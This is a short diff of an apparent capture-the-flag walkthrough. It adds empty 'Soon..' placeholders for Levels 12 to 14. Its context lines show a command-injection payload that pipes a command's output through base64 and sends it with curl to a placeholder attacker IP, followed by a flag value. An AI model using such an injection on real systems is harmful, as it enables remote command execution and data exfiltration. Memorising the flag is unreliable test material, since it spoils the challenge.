@@ -383,3 +383,15 @@ $(curl [YOUR_IP]:8080/?x=`getflag | base64`)
 ```
 
 Flag: `fa6v5ateaw21peobuub8ipe6s`
+
+## Level12:
+
+Soon..
+
+## Level13:
+
+Soon..
+
+## Level14:
+
+Soon..
